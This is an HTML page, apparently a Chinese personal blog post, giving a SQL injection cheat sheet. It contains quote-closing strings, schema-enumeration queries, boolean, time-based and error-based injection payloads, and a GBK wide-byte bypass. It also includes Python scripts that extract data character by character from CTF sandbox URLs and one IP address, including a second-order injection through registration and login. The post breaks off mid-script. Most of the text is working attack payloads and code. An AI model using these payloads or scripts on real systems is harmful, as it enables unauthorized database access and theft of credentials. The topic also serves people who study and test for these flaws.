@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        SQL注入常用姿势 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">SQL注入常用姿势</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/OWASP/" class="post-tag">#OWASP</a>
+  
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="post-tag">#SQL注入</a>
+  
+
+
+          <span class="post-date">2023-03-12</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AD%E5%90%88"><span class="toc-text">闭合</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%89%8B%E6%B3%A8"><span class="toc-text">普通手注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94"><span class="toc-text">布尔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4"><span class="toc-text">时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99"><span class="toc-text">报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="toc-text">宽字节</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1"><span class="toc-text">二次</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0"><span class="toc-text">堆叠</span></a></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">))</span></span><br><span class="line"><span class="string">&#x27;</span>)</span><br><span class="line">&quot;)</span><br><span class="line">&#x27;))</span><br><span class="line">&quot;))</span><br><span class="line"><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">\</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="普通手注"><a href="#普通手注" class="headerlink" title="普通手注"></a>普通手注</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>数据库总数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>数据库长度</span><br><span class="line">length(database())</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>数据库名字</span><br><span class="line">database()</span><br><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>表的个数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database())</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>表名长度</span><br><span class="line"><span class="keyword">select</span> length(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>表名</span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA <span class="operator">=</span> database() limit <span class="number">0</span>,<span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>列数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>列名长度</span><br><span class="line"><span class="keyword">select</span> length(column_name) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>列名</span><br><span class="line"><span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>数据长度</span><br><span class="line"><span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">11.</span>数据</span><br><span class="line"><span class="keyword">select</span> concat(username,&quot;-----&quot;,password) <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注常用函数</p>
+<p><code>截取</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(), <span class="keyword">right</span>(), <span class="built_in">substring</span>(), substring_index(), mid(), substr()</span><br><span class="line">其中mid(), substr() 等价于 <span class="built_in">substring</span>() 函数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ORD()  ascii()                  :转换成ascii码</span><br><span class="line">Length()                        :统计长度</span><br><span class="line">Sleep()                         :延迟函数</span><br><span class="line">benchmark()                     :延迟函数</span><br><span class="line">If(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)        :条件语句</span><br><span class="line">regexp                          :正则</span><br><span class="line">database()                      :查看当前数据库名</span><br><span class="line">version()                       :查看数据库版本</span><br><span class="line"><span class="keyword">user</span>()                          :查看当前用户</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>按位爆破</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>()</span><br><span class="line">ascii()、substr()</span><br><span class="line">regexp</span><br><span class="line">if()</span><br><span class="line">ord()、mid()</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and left((select database() limit 0,1),1)=&#x27;</span>s<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h2><p>漏洞验证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or  length(database())&gt;1#</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(<span class="keyword">select</span> xxx,x,<span class="number">1</span>))<span class="operator">&gt;</span>x,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">mid(<span class="keyword">select</span> ,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;z&#x27;</span></span><br><span class="line"><span class="keyword">left</span>((<span class="keyword">select</span> database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>#</span><br><span class="line">ORD(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span></span><br><span class="line"><span class="keyword">select</span> xxx <span class="operator">=</span><span class="string">&#x27;user&#x27;</span> </span><br><span class="line">xxxx regexp <span class="string">&#x27;^us[a-z]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本处理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://challenge-76d8ef356dbd48f7.sandbox.ctfhub.com:10800/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">min</span>=<span class="number">0</span></span><br><span class="line"><span class="built_in">max</span>=<span class="number">127</span></span><br><span class="line">mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">while</span> mid&gt;<span class="built_in">min</span>:</span><br><span class="line">        <span class="comment">#payload=&quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;),1,0)&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload=&quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),&#123;&#125;,1))&gt;&#123;&#125;),1,0)&quot;.format(i,mid)</span></span><br><span class="line">        payload=<span class="string">&quot;if((ascii(substr(right((select group_concat(flag) from flag),10),&#123;&#125;,1))&gt;&#123;&#125;),1,0)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#payload=&quot; or if((ascii(substr((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;),1,0)# &quot;.format(i,mid)</span></span><br><span class="line">        params=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">             &#125;</span><br><span class="line">        res=requests.get(url,params=params).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;query_success&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">              <span class="built_in">min</span>=mid</span><br><span class="line">              mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">            mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(mid+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">0</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">127</span></span><br><span class="line">    mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>验证</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and sleep(3)#</span></span><br><span class="line"><span class="string">benchmark(50000000,encode(&#x27;</span>msg<span class="string">&#x27;,&#x27;</span>key<span class="string">&#x27;)) //运行encode(&#x27;</span>msg<span class="string">&#x27;,&#x27;</span>key<span class="string">&#x27;)操作50000000 次，会占用一段时间。</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">if</span>(ascii(substr(select xxx,x,<span class="number">1</span>))&gt;x,sleep(<span class="number">2</span>),<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span>.sleep(<span class="keyword">if</span>((lengrh(database())&gt;<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>))</span><br><span class="line"><span class="number">3</span>.sleep(<span class="keyword">if</span>((ORD(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="number">115</span> ),<span class="number">0</span>,<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure>
+
+<p>脚本处理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">times = time.time()</span><br><span class="line">res = requests.post(url = url, data = data)</span><br><span class="line"><span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">   flag+=...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://challenge-246727d4e05c9be7.sandbox.ctfhub.com:10800/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">min</span>=<span class="number">0</span></span><br><span class="line"><span class="built_in">max</span>=<span class="number">127</span></span><br><span class="line">mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">while</span> mid&gt;<span class="built_in">min</span>:</span><br><span class="line">        payload=<span class="string">&quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;),sleep(2),0)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#payload=&quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),&#123;&#125;,1))&gt;&#123;&#125;),1,0)&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload=&quot;if((ascii(substr(right((select group_concat(flag) from flag),10),&#123;&#125;,1))&gt;&#123;&#125;),1,0)&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload=&quot; or if((ascii(substr((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;),1,0)# &quot;.format(i,mid)</span></span><br><span class="line">        params=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">             &#125;</span><br><span class="line">        times = time.time()</span><br><span class="line">        res=requests.get(url,params=params).text</span><br><span class="line">        <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">min</span>=mid</span><br><span class="line">              mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">            mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(mid+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">0</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">127</span></span><br><span class="line">    mid=<span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p><code>常用函数</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rand()  产生一个不固定的<span class="number">0</span>~<span class="number">1</span>的随机数列，加了参数之后会变成固定的伪随机数列</span><br><span class="line">rand(<span class="number">0</span>),rand(<span class="number">1</span>)，当使用一个整数参数时，rand使用该参数作为种子生成一个固定的伪随机数列</span><br><span class="line">floor  向下取整 floor(<span class="number">2.5</span>) == <span class="number">2</span></span><br><span class="line">count()统计元组的个数</span><br><span class="line">concat() 字符串连接 concat(<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>,) =&gt;<span class="string">&#x27;aaa~~bbb&#x27;</span> </span><br><span class="line">concat_ws() 字符串连接 concat_ws(<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;bbb&#x27;</span>,) =&gt;<span class="string">&#x27;aaa~~bbb&#x27;</span>   </span><br><span class="line">extractvalue(最长<span class="number">32</span>位)	MySQL <span class="number">5.1</span>.<span class="number">5</span>版本中添加了对XML文档进行查询和修改的函数，分别是 ExtractValue()和 </span><br><span class="line">updateXml(最长<span class="number">32</span>位)</span><br><span class="line">name_const(): mysql存储过程中的本地变量会被一个内部函数 name_const 转化,似乎是专门为存储过程设计的,没有提到有其它特别之处. 	</span><br></pre></td></tr></table></figure>
+
+<p><code>姿势</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>利用 <span class="built_in">floor</span>(rand(x)<span class="operator">*</span><span class="number">2</span>) 的执行bug进行报错注入</span><br><span class="line">concat((查询语句),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; union select 1,count(*),concat((查询语句),floor(rand(0)*2))a from information_schema.columns group by a#</span><br><span class="line">?id=1&quot; <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((查询语句),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)#</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>报错函数</span><br><span class="line"><span class="number">1</span>&quot; and extractvalue(1,concat(0x7e,(查询语句)))#</span><br><span class="line">1 and updatexml(1,concat(0x7e,(查询语句),0x7e),1)#</span><br><span class="line"></span><br><span class="line">3.name_const</span><br><span class="line">1&quot; <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> name_const((查询语句),<span class="number">1</span>),name_const((查询语句),<span class="number">1</span>))x #</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span><span class="keyword">double</span></span><br><span class="line"><span class="number">1</span>&quot; union select (exp(~(select * from(select user())a))),2,3#</span><br><span class="line"></span><br><span class="line">5.bright</span><br><span class="line">1&quot; <span class="keyword">union</span> <span class="keyword">select</span> (<span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) <span class="operator">-</span> <span class="operator">~</span><span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h1><p>1%df’ or 1=1%23 </p>
+<p>当单引号被转义，但数据库使用的编码是gbk编码（两个字节表示一个字符的时候），==%df会与反斜杠闭合形成一个新的字符从而闭合单引号==。</p>
+<blockquote>
+<p>username = %df’</p>
+<p><em>#</em> 经gbk解码后变为：</p>
+<p>select * from users where username =’運’#</p>
+</blockquote>
+<h1 id="二次"><a href="#二次" class="headerlink" title="二次"></a>二次</h1><p>具体情况具体判断</p>
+<p>贴一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://106.54.163.94:10000/&#x27;</span></span><br><span class="line">    url1 = url + <span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">    url2 = url + <span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">    url3 = url + <span class="string">&#x27;user.php&#x27;</span></span><br><span class="line">    url4 = url + <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">       </span><br><span class="line">        s = requests.Session()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment"># 注册数据包</span></span><br><span class="line">            data1 = &#123;</span><br><span class="line">                <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;aiwin@163.com&quot;</span>,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;3&#x27; and if((ascii(substr((select f14g from f14g), <span class="subst">&#123;i&#125;</span>, 1)) = <span class="subst">&#123;j&#125;</span>), 1, 0)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1@#af3532&quot;</span>,</span><br><span class="line">                <span class="string">&quot;confirmpass&quot;</span>: <span class="string">&quot;1@#af3532&quot;</span>,</span><br><span class="line">                <span class="string">&quot;register&quot;</span>: <span class="string">&quot;1@#af3532&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 登录数据包</span></span><br><span class="line">            data2 = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;3&#x27; and if((ascii(substr((select f14g from f14g), <span class="subst">&#123;i&#125;</span>, 1)) = <span class="subst">&#123;j&#125;</span>), 1, 0)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1@#af3532&quot;</span>,</span><br><span class="line">                <span class="string">&quot;login&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 发送日记数据包</span></span><br><span class="line">            data4 = &#123;</span><br><span class="line">                <span class="string">&quot;content&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;%E4%BF%9D%E5%AD%98&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            response_regt = requests.post(url=url1, data=data1)</span><br><span class="line">            response_login = s.post(url=url2, data=data2)</span><br><span class="line">            response_sent = s.post(url=url3, data=data4)</span><br><span class="line">            response_see = s.get(url=url4)</span><br><span class="line">            <span class="comment">#print(response_see.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;uploads/default.jpg&quot;</span> <span class="keyword">in</span> response_see.text:  <span class="comment"># 正确则将low = mid + 1，继续搜索</span></span><br><span class="line">               </span><br><span class="line">           </span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 